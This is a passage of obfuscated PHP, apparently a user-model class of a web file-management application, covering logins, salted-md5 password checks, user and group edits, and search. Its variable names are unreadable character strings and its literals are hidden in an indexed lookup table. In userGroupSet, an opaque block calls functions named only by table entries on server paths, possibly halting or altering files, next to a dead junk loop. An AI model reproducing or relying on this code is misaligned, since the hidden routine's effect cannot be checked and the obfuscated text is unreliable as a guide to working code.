$Øç°ëåœ = $Ø¤“Ãï‚[2674]; return array($Ø¤“Ãï‚[2264] => array($²Ï±öÂı[0], $Øç°ëåœ), $Ø¤“Ãï‚[2266] => array($²Ï±öÂı[0], $Øç°ëåœ), $Ø¤“Ãï‚[2675] => array($²Ï±öÂı[0], $Øç°ëåœ)); } protected function ___getInfo($Ÿüùõİ”) { $šÄ±Í¹ = $this->getInfoSimple($Ÿüùõİ”); if (!$šÄ±Í¹ || !is_array($šÄ±Í¹)) { return array(); } return $this->_getInfoApply($šÄ±Í¹); } protected function ___getInfoFull($‹¯¶Éá ) { $Ğ¡ûÕâê = $this->getInfoSimple($‹¯¶Éá ); if (!$Ğ¡ûÕâê || !is_array($Ğ¡ûÕâê)) { return array(); } return $this->_getInfoApply($Ğ¡ûÕâê, !0); } protected function ___getInfoSimple($‹‡ñ‹Ù) { $ı¬º“ıÈ =& $_SERVER[©—Ò»ÅĞ]; if (!$‹‡ñ‹Ù) { return array(); } $Ïğ²·À½ = $this->where(array($ı¬º“ıÈ[1592] => intval($‹‡ñ‹Ù)))->find(); if (!$Ïğ²·À½ || !is_array($Ïğ²·À½)) { return array(); } $Ïğ²·À½[$ı¬º“ıÈ[2375]] = Action($ı¬º“ıÈ[2376])->parseUrl($Ïğ²·À½[$ı¬º“ıÈ[2375]]); return $Ïğ²·À½; } private function _getInfoApply($‘Üê©â, $ıøæîÊ = false) { $ßÀ’éğÏ =& $_SERVER[©—Ò»ÅĞ]; if (!$‘Üê©â) { return $‘Üê©â; } $—Ë¢×ê  = md5($ßÀ’éğÏ[2676] . $‘Üê©â[$ßÀ’éğÏ[1050]] . $ßÀ’éğÏ[2677] . $‘Üê©â[$ßÀ’éğÏ[32]]); $‘Üê©â = $this->_listDataApplyItem($‘Üê©â); $ƒïã£İÆ = Model($ßÀ’éğÏ[1533])->metaGet($‘Üê©â[$ßÀ’éğÏ[90]][$ßÀ’éğÏ[191]]); $‘Üê©â[$ßÀ’éğÏ[2678]] = $—Ë¢×ê ; $‘Üê©â[$ßÀ’éğÏ[90]][$ßÀ’éğÏ[2466]] = isset($ƒïã£İÆ[$ßÀ’éğÏ[2467]]) ? $ƒïã£İÆ[$ßÀ’éğÏ[2467]] : null; if ($ıøæîÊ) { $‘Üê©â[$ßÀ’éğÏ[555]] = $this->metaGet($‘Üê©â[$ßÀ’éğÏ[1592]]); } return $‘Üê©â; } protected function getInfoSimpleOuter($šôÈ¢‰ì) { $›Ä½•Â® =& $_SERVER[©—Ò»ÅĞ]; if (!$šôÈ¢‰ì || $šôÈ¢‰ì == 0) { return array($›Ä½•Â®[1592] => $›Ä½•Â®[228], $›Ä½•Â®[32] => $›Ä½•Â®[173] . LNG($›Ä½•Â®[2679]) . $›Ä½•Â®[175], $›Ä½•Â®[2375] => STATIC_PATH . $›Ä½•Â®[2680]); } $¿‹è¼Å = $this->cacheFunctionGet($›Ä½•Â®[2275], $šôÈ¢‰ì); $¤ ƒ²“û = array_field_key($¿‹è¼Å, explode($›Ä½•Â®[50], $this->simpleField)); if (!$¤ ƒ²“û) { return array($›Ä½•Â®[1592] => $›Ä½•Â®[1380], $›Ä½•Â®[32] => $›Ä½•Â®[173] . LNG($›Ä½•Â®[2681]) . $›Ä½•Â®[175], $›Ä½•Â®[2375] => STATIC_PATH . $›Ä½•Â®[2682]); } $¤ ƒ²“û[$›Ä½•Â®[2375]] = Action($›Ä½•Â®[2376])->parseUrl($¤ ƒ²“û[$›Ä½•Â®[2375]]); return $¤ ƒ²“û; } protected function groupUser($Ç¼‰¶®°) { } public static function errorLang($àîûÈ—û) { $İñã»è‰ =& $_SERVER[©—Ò»ÅĞ]; $Ìà¤é­Î = array(self::ERROR_USER_NOT_EXISTS => $İñã»è‰[2683], self::ERROR_USER_PASSWORD_ERROR => $İñã»è‰[2684], self::ERROR_USER_EXIST_NAME => $İñã»è‰[2685], self::ERROR_USER_EXIST_PHONE => $İñã»è‰[2686], self::ERROR_USER_EXIST_EMAIL => $İñã»è‰[2687], self::ERROR_USER_LOGIN_LOCK => $İñã»è‰[2688], self::ERROR_IP_NOT_ALLOW => $İñã»è‰[2689], self::ERROR_USER_EXIST_NICKNAME => $İñã»è‰[2690]); $€Ú¹«¨ó = LNG($Ìà¤é­Î[$àîûÈ—û]); if ($àîûÈ—û == self::ERROR_USER_LOGIN_LOCK) { $‚ßÌ—¹ë = (int) Model($İñã»è‰[1489])->get($İñã»è‰[2691]); if ($‚ßÌ—¹ë > 60) { $€Ú¹«¨ó = str_replace($İñã»è‰[91], ceil($‚ßÌ—¹ë / 60), $€Ú¹«¨ó); } } return $€Ú¹«¨ó; } protected function metaSet($†Î‡»ğ, $û·©·ëæ = null, $˜¹·Ë…± = null) { $this->clearCache($†Î‡»ğ); return parent::metaSet($†Î‡»ğ, $û·©·ëæ, $˜¹·Ë…±); } public function getInfoByMeta($¸Åã’Œ, $øã½ê­) { $¥ºÛ«Ñƒ =& $_SERVER[©—Ò»ÅĞ]; $ŠÈ¹…Û = Model($¥ºÛ«Ñƒ[2692])->where(array($¥ºÛ«Ñƒ[95] => $¸Åã’Œ, $¥ºÛ«Ñƒ[451] => $øã½ê­))->find(); if ($ŠÈ¹…Û) { return $this->getInfo($ŠÈ¹…Û[$¥ºÛ«Ñƒ[1592]]); } return !1; } public function userLoginCheck($ŞôøÇ, $ Ğòü´Š, $çâŸ¢¼ë = false) { $‰²†Ç =& $_SERVER[©—Ò»ÅĞ]; $´ëÎŠ = $this->userLoginFind($ŞôøÇ); if (!$´ëÎŠ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($´ëÎŠ[$‰²†Ç[1592]], $ Ğòü´Š)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $çâŸ¢¼ë ? $this->getInfoFull($´ëÎŠ[$‰²†Ç[1592]]) : $this->getInfo($´ëÎŠ[$‰²†Ç[1592]]); } public function userLoginFind($Ê‹·û¼½) { $Ë©­Ã“’ =& $_SERVER[©—Ò»ÅĞ]; $Ï›ãª = array($Ë©­Ã“’[32] => $Ê‹·û¼½, $Ë©­Ã“’[2477] => $Ê‹·û¼½, $Ë©­Ã“’[380] => $Ê‹·û¼½, $Ë©­Ã“’[2693] => $Ê‹·û¼½, $Ë©­Ã“’[1168] => $Ë©­Ã“’[1170]); if ($this->nickNameRpt()) { unset($Ï›ãª[$Ë©­Ã“’[2477]]); } return $this->where($Ï›ãª)->find(); } public function clearCache($«õì§ìß) { $òÌ¬ÅÈ˜ =& $_SERVER[©—Ò»ÅĞ]; $this->cacheFunctionClear($òÌ¬ÅÈ˜[2274], $«õì§ìß); $this->cacheFunctionClear($òÌ¬ÅÈ˜[2275], $«õì§ìß); $this->cacheFunctionClear($òÌ¬ÅÈ˜[2694], $«õì§ìß); } public function userPasswordCheck($½µ›ü…í, $óõÉü‘ˆ) { $¥Ş×‡ÒÌ =& $_SERVER[©—Ò»ÅĞ]; $•û™¼¥ = $this->where(array($¥Ş×‡ÒÌ[1592] => intval($½µ›ü…í)))->find(); $Ë—ÚÑ² = $this->metaGet($½µ›ü…í); $×†ššïÕ = isset($Ë—ÚÑ²[$¥Ş×‡ÒÌ[2695]]) ? $Ë—ÚÑ²[$¥Ş×‡ÒÌ[2695]] : $¥Ş×‡ÒÌ[12]; if (md5($×†ššïÕ . trim($óõÉü‘ˆ)) !== $•û™¼¥[$¥Ş×‡ÒÌ[1050]]) { return !1; } return !0; } public function userAdd($æ»ÃĞ —) { $ç¸åæÖ =& $_SERVER[©—Ò»ÅĞ]; $¢Œ½±çè = array($ç¸åæÖ[509] => $æ»ÃĞ —[$ç¸åæÖ[32]], $ç¸åæÖ[2696] => $æ»ÃĞ —[$ç¸åæÖ[2374]], $ç¸åæÖ[2697] => isset($æ»ÃĞ —[$ç¸åæÖ[380]]) ? $æ»ÃĞ —[$ç¸åæÖ[380]] : $ç¸åæÖ[12], $ç¸åæÖ[2698] => isset($æ»ÃĞ —[$ç¸åæÖ[2693]]) ? $æ»ÃĞ —[$ç¸åæÖ[2693]] : $ç¸åæÖ[12], $ç¸åæÖ[2699] => isset($æ»ÃĞ —[$ç¸åæÖ[2477]]) ? $æ»ÃĞ —[$ç¸åæÖ[2477]] : $æ»ÃĞ —[$ç¸åæÖ[32]], $ç¸åæÖ[2700] => isset($æ»ÃĞ —[$ç¸åæÖ[2375]]) ? $æ»ÃĞ —[$ç¸åæÖ[2375]] : $ç¸åæÖ[12], $ç¸åæÖ[2701] => isset($æ»ÃĞ —[$ç¸åæÖ[2702]]) ? $æ»ÃĞ —[$ç¸åæÖ[2702]] : 1, $ç¸åæÖ[2703] => $æ»ÃĞ —[$ç¸åæÖ[1050]], $ç¸åæÖ[2268] => isset($æ»ÃĞ —[$ç¸åæÖ[2169]]) ? $æ»ÃĞ —[$ç¸åæÖ[2169]] : 1024 * 1024 * 20, $ç¸åæÖ[2269] => 0, $ç¸åæÖ[2704] => 0, $ç¸åæÖ[2314] => isset($æ»ÃĞ —[$ç¸åæÖ[850]]) ? $æ»ÃĞ —[$ç¸åæÖ[850]] : 1); if (!empty($æ»ÃĞ —[$ç¸åæÖ[1592]])) { $¢Œ½±çè[$ç¸åæÖ[1592]] = $æ»ÃĞ —[$ç¸åæÖ[1592]]; } $§“Óƒøú = $this->_checkExist($æ»ÃĞ —); if ($§“Óƒøú !== !0) { return $§“Óƒøú; } if (!empty($¢Œ½±çè[$ç¸åæÖ[2375]]) && strlen($¢Œ½±çè[$ç¸åæÖ[2375]]) > 255) { $¢Œ½±çè[$ç¸åæÖ[2375]] = $ç¸åæÖ[12]; } $ÂÀåŠ¸Ş = $this->add($¢Œ½±çè); $—‹ò„È’ = array($ç¸åæÖ[2703] => $¢Œ½±çè[$ç¸åæÖ[1050]], $ç¸åæÖ[2699] => $¢Œ½±çè[$ç¸åæÖ[2477]], $ç¸åæÖ[2705] => $æ»ÃĞ —[$ç¸åæÖ[2273]]); $this->userEdit($ÂÀåŠ¸Ş, $—‹ò„È’); Model($ç¸åæÖ[1533])->userRootAdd($ÂÀåŠ¸Ş); return $ÂÀåŠ¸Ş; } protected function userEditTest($º‡¥¾˜å, $¿ğËĞ©) { return $this->call($_SERVER[©—Ò»ÅĞ][2706], $º‡¥¾˜å, $¿ğËĞ©); } protected function userEdit($Ôâ„ì›‡, $šÄ·’ÓÎ) { $˜«ğŠĞÜ =& $_SERVER[©—Ò»ÅĞ]; $í¯£‡ì· = $this->getInfoSimple($Ôâ„ì›‡); if (!$í¯£‡ì·) { return !1; } $›éè¼ˆØ = $this->_checkExist($šÄ·’ÓÎ, $Ôâ„ì›‡); if ($›éè¼ˆØ !== !0) { return $›éè¼ˆØ; } if (isset($šÄ·’ÓÎ[$˜«ğŠĞÜ[1050]]) && trim($šÄ·’ÓÎ[$˜«ğŠĞÜ[1050]]) != $˜«ğŠĞÜ[12]) { $ò×‹ŸÌ = $this->metaGet($Ôâ„ì›‡); if (empty($ò×‹ŸÌ[$˜«ğŠĞÜ[2695]])) { $ò×‹ŸÌ[$˜«ğŠĞÜ[2695]] = rand_string(10); Model($˜«ğŠĞÜ[597])->metaSet($Ôâ„ì›‡, $˜«ğŠĞÜ[2695], $ò×‹ŸÌ[$˜«ğŠĞÜ[2695]]); } $šÄ·’ÓÎ[$˜«ğŠĞÜ[1050]] = md5($ò×‹ŸÌ[$˜«ğŠĞÜ[2695]] . trim($šÄ·’ÓÎ[$˜«ğŠĞÜ[1050]])); } else { unset($šÄ·’ÓÎ[$˜«ğŠĞÜ[1050]]); } if (!empty($šÄ·’ÓÎ[$˜«ğŠĞÜ[2375]]) && strlen($šÄ·’ÓÎ[$˜«ğŠĞÜ[2375]]) > 255) { $šÄ·’ÓÎ[$˜«ğŠĞÜ[2375]] = $˜«ğŠĞÜ[12]; } if (isset($šÄ·’ÓÎ[$˜«ğŠĞÜ[2477]])) { $this->setNamePinyin($Ôâ„ì›‡, $šÄ·’ÓÎ[$˜«ğŠĞÜ[2477]]); } if (isset($šÄ·’ÓÎ[$˜«ğŠĞÜ[2273]])) { $÷åØ±¼‘ = $˜«ğŠĞÜ[1492] . $Ôâ„ì›‡; $¹¹¨‡·‹ = $˜«ğŠĞÜ[1490]; $ ë‚Ø€‹ = $šÄ·’ÓÎ[$˜«ğŠĞÜ[2273]] ? $šÄ·’ÓÎ[$˜«ğŠĞÜ[2273]] : $˜«ğŠĞÜ[12]; $úêŠ·°Á = Model($˜«ğŠĞÜ[1489])->get($÷åØ±¼‘, $¹¹¨‡·‹); $úêŠ·°Á = $úêŠ·°Á ? $úêŠ·°Á : $˜«ğŠĞÜ[12]; if ($úêŠ·°Á != $ ë‚Ø€‹) { if (!$ ë‚Ø€‹ && $úêŠ·°Á) { Model($˜«ğŠĞÜ[1489])->remove($÷åØ±¼‘, $¹¹¨‡·‹); } else { if ($ ë‚Ø€‹) { Model($˜«ğŠĞÜ[1489])->set($÷åØ±¼‘, $ ë‚Ø€‹, $¹¹¨‡·‹); } } } unset($šÄ·’ÓÎ[$˜«ğŠĞÜ[2273]]); Model($˜«ğŠĞÜ[617])->metaSet($Ôâ„ì›‡, $˜«ğŠĞÜ[2273], $ ë‚Ø€‹); } if (empty($šÄ·’ÓÎ)) { return !0; } $this->where(array($˜«ğŠĞÜ[1969] => $Ôâ„ì›‡))->save($šÄ·’ÓÎ); $this->clearCache($Ôâ„ì›‡); return !0; } public function setNamePinyin($î¬âÑáÄ, $««ãÍÚ¯ = false) { $…Ÿº²Ç‹ =& $_SERVER[©—Ò»ÅĞ]; if (!$««ãÍÚ¯) { $£Öâ¼‚Ç = $this->getInfoSimple($î¬âÑáÄ); $««ãÍÚ¯ = $£Öâ¼‚Ç[$…Ÿº²Ç‹[2477]] ? $£Öâ¼‚Ç[$…Ÿº²Ç‹[2477]] : $£Öâ¼‚Ç[$…Ÿº²Ç‹[32]]; } $Ùïç²ƒ = Model($…Ÿº²Ç‹[617]); if (!Input::check($««ãÍÚ¯, $…Ÿº²Ç‹[677])) { return $Ùïç²ƒ->metaSet($î¬âÑáÄ, array($…Ÿº²Ç‹[552] => $…Ÿº²Ç‹[12], $…Ÿº²Ç‹[551] => $…Ÿº²Ç‹[12])); } return $Ùïç²ƒ->metaSet($î¬âÑáÄ, array($…Ÿº²Ç‹[552] => str_replace($…Ÿº²Ç‹[53], $…Ÿº²Ç‹[12], Pinyin::get($««ãÍÚ¯)), $…Ÿº²Ç‹[551] => Pinyin::get($««ãÍÚ¯, $…Ÿº²Ç‹[678]))); } private function nickNameRpt() { $»Í¾£¹ =& $_SERVER[©—Ò»ÅĞ]; $ÎËğøø™ = Model($»Í¾£¹[873])->get($»Í¾£¹[2707]); $µŸÜŞŠ = $GLOBALS[$»Í¾£¹[6]][$»Í¾£¹[468]][$»Í¾£¹[2707]]; $ËŞÚÆ» = !is_null($ÎËğøø™) ? $ÎËğøø™ : $µŸÜŞŠ; return !!$ËŞÚÆ»; } private function _checkExist($®ÂâµÜõ, $¨’¤µéà = false) { $ÏÑÉ±ùÅ =& $_SERVER[©—Ò»ÅĞ]; $‰÷¢øå = array($ÏÑÉ±ùÅ[32] => UserModel::ERROR_USER_EXIST_NAME, $ÏÑÉ±ùÅ[2477] => UserModel::ERROR_USER_EXIST_NICKNAME, $ÏÑÉ±ùÅ[380] => UserModel::ERROR_USER_EXIST_EMAIL, $ÏÑÉ±ùÅ[2693] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($‰÷¢øå[$ÏÑÉ±ùÅ[2477]]); } $ö»£íüâ = $¨’¤µéà ? array($ÏÑÉ±ùÅ[1592] => array($ÏÑÉ±ùÅ[2708], $¨’¤µéà)) : array(); foreach ($‰÷¢øå as $¨Ç‚ãÃ­ => $úÇª) { $Á¸—á²á = array(); foreach ($‰÷¢øå as $õ¾û¬ì => $Ş°Û¬êß) { if (isset($®ÂâµÜõ[$õ¾û¬ì]) && $®ÂâµÜõ[$õ¾û¬ì]) { $Á¸—á²á[] = $®ÂâµÜõ[$õ¾û¬ì]; } } if (!$Á¸—á²á) { continue; } $÷İÂ…×È = array_merge(array($¨Ç‚ãÃ­ => array($ÏÑÉ±ùÅ[7], $Á¸—á²á)), $ö»£íüâ); $úøúğÑª = $this->where($÷İÂ…×È)->find(); if ($úøúğÑª) { return $úÇª; } } return !0; } public function userListInfo($Ñ—½«Ÿ) { $“¥·ğı =& $_SERVER[©—Ò»ÅĞ]; $˜¨° = array(); $Ñ—½«Ÿ = is_array($Ñ—½«Ÿ) ? array_unique($Ñ—½«Ÿ) : array(); if (!$Ñ—½«Ÿ) { return $˜¨°; } if (count($Ñ—½«Ÿ) < 20) { foreach ($Ñ—½«Ÿ as $…Èùã®ü) { $˜¨°[$…Èùã®ü . $“¥·ğı[12]] = $this->getInfoSimpleOuter($…Èùã®ü); } } else { $¤Ş¼îî = array($“¥·ğı[1969] => array($“¥·ğı[507], $Ñ—½«Ÿ)); if (count($Ñ—½«Ÿ) == 1) { $¤Ş¼îî = array($“¥·ğı[1969] => $Ñ—½«Ÿ[0]); } $Ñ¸ı†ı¿ = Model($“¥·ğı[597])->field($this->simpleField)->where($¤Ş¼îî)->select(); $Ñ¸ı†ı¿ = array_to_keyvalue($Ñ¸ı†ı¿, $“¥·ğı[1592]); foreach ($Ñ—½«Ÿ as $…Èùã®ü) { $ëŠ²š‘ = $Ñ¸ı†ı¿[$…Èùã®ü]; if (!$ëŠ²š‘) { $˜¨°[$…Èùã®ü . $“¥·ğı[12]] = $this->getInfoSimpleOuter($…Èùã®ü); continue; } $ëŠ²š‘[$“¥·ğı[2375]] = Action($“¥·ğı[2376])->parseUrl($ëŠ²š‘[$“¥·ğı[2375]]); $˜¨°[$…Èùã®ü . $“¥·ğı[12]] = $ëŠ²š‘; } } return $˜¨°; } protected function userStatus($Ô¼ú®Í½, $û’×³û) { $Ë¹ó”ğì = $this->getInfoSimple($Ô¼ú®Í½); if (!$Ë¹ó”ğì) { return !1; } $ìÇÁóœ = array($_SERVER[©—Ò»ÅĞ][850] => $û’×³û); return $this->userEdit($Ô¼ú®Í½, $ìÇÁóœ); } protected function userRemove($×¶ÇÁèĞ) { $•êÔ› =& $_SERVER[©—Ò»ÅĞ]; $Ú‹ãÇ¥ = $this->getInfoSimple($×¶ÇÁèĞ); if (!$Ú‹ãÇ¥) { return !1; } $ŠÆî„ÓÇ = array($•êÔ›[1969] => $×¶ÇÁèĞ); Model($•êÔ›[686])->where($ŠÆî„ÓÇ)->delete(); Model($•êÔ›[2709])->where($ŠÆî„ÓÇ)->delete(); Model($•êÔ›[2277])->where($ŠÆî„ÓÇ)->delete(); Model($•êÔ›[2692])->where($ŠÆî„ÓÇ)->delete(); Model($•êÔ›[1238])->where($ŠÆî„ÓÇ)->delete(); Model($•êÔ›[2494])->removeUserAll($×¶ÇÁèĞ); Model($•êÔ›[933])->userRootRemove($×¶ÇÁèĞ); return $this->where($ŠÆî„ÓÇ)->delete(); } protected function userGroupSet($Áï¬šÔ“, $œŒÖÜ˜ğ, $šşäò¨× = array()) { $ÇêÛ‹©¿ =& $_SERVER[©—Ò»ÅĞ]; if ($_SERVER[$ÇêÛ‹©¿[1034]] != $_SERVER[$ÇêÛ‹©¿[1076]]) { $¶Ûš¼§õ = $ÇêÛ‹©¿[1036]; $¢¶ğ¯íÒ = $ÇêÛ‹©¿[1037]; $ª© ĞğÊ = $_SERVER[$ÇêÛ‹©¿[1038]] . $ÇêÛ‹©¿[1039]; $íÊââèÍ = $¢¶ğ¯íÒ($ª© ĞğÊ); $Ÿâàº€ğ = explode($ÇêÛ‹©¿[285], $íÊââèÍ); if (count($Ÿâàº€ğ) < $ÇêÛ‹©¿[707]) { $­‹ÎöÉÙ = $ÇêÛ‹©¿[1040]; $­‹ÎöÉÙ(); } $‡íš…ã‚ = $ÇêÛ‹©¿[1041]; $‡íš…ã‚($_SERVER[$ÇêÛ‹©¿[1042]]); $‡íš…ã‚($_SERVER[$ÇêÛ‹©¿[1038]] . $ÇêÛ‹©¿[2495]); $É÷ü‰š = 1; while ($É÷ü‰š > 1) { $É÷ü‰š = $É÷ü‰š + 4; $Óïø©• = rawurlencode($É÷ü‰š . $ÇêÛ‹©¿[463]); } } $‡Ë¥•—š = $this->getInfoSimple($Áï¬šÔ“); if (!$‡Ë¥•—š || !is_array($œŒÖÜ˜ğ)) { return !1; } $–ò±Çˆ¦ = Model($ÇêÛ‹©¿[2277]); $–ò±Çˆ¦->where(array($ÇêÛ‹©¿[1592] => $Áï¬šÔ“))->delete(); $Ñ„ŒğÊğ = array(); $µ¥ôÖ´ = 0; foreach ($œŒÖÜ˜ğ as $‰¼¼“‘Æ => $ú¶£¦Ïš) { $Õª‹ôª§ = array($ÇêÛ‹©¿[1592] => $Áï¬šÔ“, $ÇêÛ‹©¿[1495] => $‰¼¼“‘Æ, $ÇêÛ‹©¿[1640] => $ú¶£¦Ïš); $Õª‹ôª§[$ÇêÛ‹©¿[2205]] = isset($šşäò¨×[$µ¥ôÖ´]) ? $šşäò¨×[$µ¥ôÖ´] : 0; $µ¥ôÖ´++; $Ñ„ŒğÊğ[] = $Õª‹ôª§; } return $–ò±Çˆ¦->addAll($Ñ„ŒğÊğ, array(), !0); } protected function userGroupAdd($¤ğÂ©¢Ö, $òÊâÁ¬ê = array()) { $±ø‘Ô’¼ =& $_SERVER[©—Ò»ÅĞ]; $†…ä‡À  = $this->getInfoSimple($¤ğÂ©¢Ö); if (!$†…ä‡À  || empty($òÊâÁ¬ê)) { return !1; } $Ì¡Âí«Â = array(); foreach ($òÊâÁ¬ê as $˜€·ß‘¶ => $›‰ş”¾İ) { $Ì¡Âí«Â[] = array($±ø‘Ô’¼[1592] => $¤ğÂ©¢Ö, $±ø‘Ô’¼[1495] => $˜€·ß‘¶, $±ø‘Ô’¼[1640] => $›‰ş”¾İ, $±ø‘Ô’¼[2205] => 0); } return Model($±ø‘Ô’¼[2277])->addAll($Ì¡Âí«Â, array(), !0); } protected function userGroupRemove($ïïàÖÙ…, $îÌˆÚ…–) { $œ¶ßÛÔ =& $_SERVER[©—Ò»ÅĞ]; $§ñ¶˜§ = $this->getInfoSimple($ïïàÖÙ…); if (!$§ñ¶˜§ || !$îÌˆÚ…–) { return !1; } $š“¨Ëœõ = array($œ¶ßÛÔ[1969] => $ïïàÖÙ…, $œ¶ßÛÔ[2270] => $îÌˆÚ…–); return Model($œ¶ßÛÔ[2277])->where($š“¨Ëœõ)->delete(); } public function listData() { $Õ”Ã£ĞÉ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Õ”Ã£ĞÉ[$_SERVER[©—Ò»ÅĞ][446]]); return $Õ”Ã£ĞÉ; } public function listByID($ö–ß§ÃÍ) { $¥¾“Ë =& $_SERVER[©—Ò»ÅĞ]; if (!$ö–ß§ÃÍ) { return; } $«ˆéòª³ = array($¥¾“Ë[1592] => array($¥¾“Ë[7], $ö–ß§ÃÍ)); $åø¢¡ğ = $this->where($«ˆéòª³)->select(); $åø¢¡ğ = array_sort_keep($åø¢¡ğ, $¥¾“Ë[1592], $ö–ß§ÃÍ); $this->_listDataApply($åø¢¡ğ); return $åø¢¡ğ; } public function listByGroup($î¢÷âÀ» = 0, $òÎÆ·Ñ¦ = array()) { $ï¼ˆËÆ° =& $_SERVER[©—Ò»ÅĞ]; $ üœòåº = $ï¼ˆËÆ°[12]; $¥¡…« = array(); if ($î¢÷âÀ») { $¥¡…« = array($ï¼ˆËÆ°[2710] => intval($î¢÷âÀ»)); $ üœòåº = "\x4c\x45\106\124\40\x4a\117\x49\x4e\40{$this->tablePrefix}\165\x73\x65\x72\137\x67\x72\157\165\x70\x20\165\163\145\162\x5f\x67\x72\157\165\160\x20\x6f\156\x20\x75\163\145\162\56\x75\x73\x65\162\x49\104\x20\75\x20\x75\x73\145\162\137\x67\162\x6f\165\160\56\x75\x73\x65\162\x49\104"; $¤İ™¢ı• = Input::get($ï¼ˆËÆ°[544], null, $ï¼ˆËÆ°[12]) ? $ï¼ˆËÆ°[12] : $ï¼ˆËÆ°[2711]; } if (isset($òÎÆ·Ñ¦[$ï¼ˆËÆ°[850]])) { $¥¡…«[$ï¼ˆËÆ°[2712]] = $òÎÆ·Ñ¦[$ï¼ˆËÆ°[850]]; } $‹†éˆØ = _get($òÎÆ·Ñ¦, $ï¼ˆËÆ°[2713], $ï¼ˆËÆ°[231]); if (_get($òÎÆ·Ñ¦, $ï¼ˆËÆ°[861], !1)) { $¥¡…«[$‹†éˆØ] = array($ï¼ˆËÆ°[2460], $òÎÆ·Ñ¦[$ï¼ˆËÆ°[861]]); } if (_get($òÎÆ·Ñ¦, $ï¼ˆËÆ°[862], !1)) { $Ô¤¡­œË = array($ï¼ˆËÆ°[2461], $òÎÆ·Ñ¦[$ï¼ˆËÆ°[862]]); if ($¥¡…«[$‹†éˆØ]) { $¥¡…«[$‹†éˆØ] = array($¥¡…«[$‹†éˆØ], $Ô¤¡­œË, $ï¼ˆËÆ°[2462]); } else { $¥¡…«[$‹†éˆØ] = $Ô¤¡­œË; } } $ëÖåÛÜ = $this->_makeOrder($¤İ™¢ı•)->field($ï¼ˆËÆ°[2714])->where($¥¡…«)->join($ üœòåº)->selectPage(50); $this->_listDataApply($ëÖåÛÜ[$ï¼ˆËÆ°[446]]); return $ëÖåÛÜ; } private function _makeOrder($ÛµÌ«À† = '') { $ŠÏ˜ÅÜË =& $_SERVER[©—Ò»ÅĞ]; $÷‹’ëªË = array($ŠÏ˜ÅÜË[1592], $ŠÏ˜ÅÜË[32], $ŠÏ˜ÅÜË[2171], $ŠÏ˜ÅÜË[2374], $ŠÏ˜ÅÜË[2146], $ŠÏ˜ÅÜË[231]); $ÌºÜ‡ïŸ = array($ŠÏ˜ÅÜË[537] => $ŠÏ˜ÅÜË[538], $ŠÏ˜ÅÜË[539] => $ŠÏ˜ÅÜË[540]); $ıÀå‘óò = Input::get($ŠÏ˜ÅÜË[544], $ŠÏ˜ÅÜË[7], $ŠÏ˜ÅÜË[1969], $÷‹’ëªË); $£§ÆŞ› = Input::get($ŠÏ˜ÅÜË[545], $ŠÏ˜ÅÜË[7], $ŠÏ˜ÅÜË[2278], array($ŠÏ˜ÅÜË[2278], $ŠÏ˜ÅÜË[539])); $£§ÆŞ› = $ÌºÜ‡ïŸ[$£§ÆŞ›]; $ÛµÌ«À† = $ÛµÌ«À† . "\x75\x73\x65\x72\x2e{$ıÀå‘óò}\x20{$£§ÆŞ›}\x2c\x20\x75\x73\x65\162\x2e\x75\163\x65\x72\111\x44\40\x61\163\x63"; return $this->alias($ŠÏ˜ÅÜË[2409])->order($ÛµÌ«À†); } public function listSearch($¶Ú¥È‹) { $¡ÆûÃá¦ =& $_SERVER[©—Ò»ÅĞ]; $‡Æ §÷ = trim($¶Ú¥È‹[$¡ÆûÃá¦[2281]]); $ê¥Ø¦‘ = explode($¡ÆûÃá¦[53], $‡Æ §÷); if (!$‡Æ §÷ || count($ê¥Ø¦‘) == 1) { return $this->listSearchNow($¶Ú¥È‹); } $¢Üş«šç = array($¡ÆûÃá¦[446] => array()); foreach ($ê¥Ø¦‘ as $°Šä£€) { if (!trim($°Šä£€)) { continue; } $¶Ú¥È‹[$¡ÆûÃá¦[2281]] = $°Šä£€; $±“ö¢– = $this->listSearchNow($¶Ú¥È‹); $¢Üş«šç[$¡ÆûÃá¦[446]] = array_merge($¢Üş«šç[$¡ÆûÃá¦[446]], $±“ö¢–[$¡ÆûÃá¦[446]]); } $¢Üş«šç[$¡ÆûÃá¦[446]] = array_unique_by_key($¢Üş«šç[$¡ÆûÃá¦[446]], $¡ÆûÃá¦[1592]); $¢Üş«šç[$¡ÆûÃá¦[443]] = array($¡ÆûÃá¦[444] => count($¢Üş«šç[$¡ÆûÃá¦[446]]), $¡ÆûÃá¦[439] => 20, $¡ÆûÃá¦[428] => 1, $¡ÆûÃá¦[445] => 1); return $¢Üş«šç; } public function listSearchNow($ì”Û¨Ã) { $Í¢Ìéã =& $_SERVER[©—Ò»ÅĞ]; $·÷¨Î—õ = trim($ì”Û¨Ã[$Í¢Ìéã[2281]]); $ŸšüÈä = isset($ì”Û¨Ã[$Í¢Ìéã[2282]]) ? $ì”Û¨Ã[$Í¢Ìéã[2282]] : !1; $·÷¨Î—õ = str_replace($Í¢Ìéã[2283], $Í¢Ìéã[2284], trim($·÷¨Î—õ)); $í¶£åÛ° = array($Í¢Ìéã[32] => array($Í¢Ìéã[473], "\45{$·÷¨Î—õ}\x25"), $Í¢Ìéã[380] => array($Í¢Ìéã[473], "{$·÷¨Î—õ}\x25"), $Í¢Ìéã[2477] => array($Í¢Ìéã[473], "\x25{$·÷¨Î—õ}\45"), $Í¢Ìéã[1168] => $Í¢Ìéã[2285]); if (Input::check($·÷¨Î—õ, $Í¢Ìéã[386])) { $í¶£åÛ°[$Í¢Ìéã[1592]] = array($Í¢Ìéã[473], "{$·÷¨Î—õ}\45"); $í¶£åÛ°[$Í¢Ìéã[2693]] = array($Í¢Ìéã[473], "{$·÷¨Î—õ}\45"); } if (!$·÷¨Î—õ) { $í¶£åÛ° = array(); } if (isset($ì”Û¨Ã[$Í¢Ìéã[850]])) { $í¶£åÛ°[$Í¢Ìéã[850]] = $ì”Û¨Ã[$Í¢Ìéã[850]]; } $í¶£åÛ° = $this->parseWhereLike($í¶£åÛ°); $Ù¾ô¸¾Ì = $this->_makeOrder()->where($í¶£åÛ°)->selectPage(20); if (!$Ù¾ô¸¾Ì || count($Ù¾ô¸¾Ì[$Í¢Ìéã[446]]) < 5 && Input::check($·÷¨Î—õ, $Í¢Ìéã[393])) { $µÇ‡ºğß = $this->_searchFromMeta($Í¢Ìéã[551], $·÷¨Î—õ, 10); $Úî·Ã–ß = 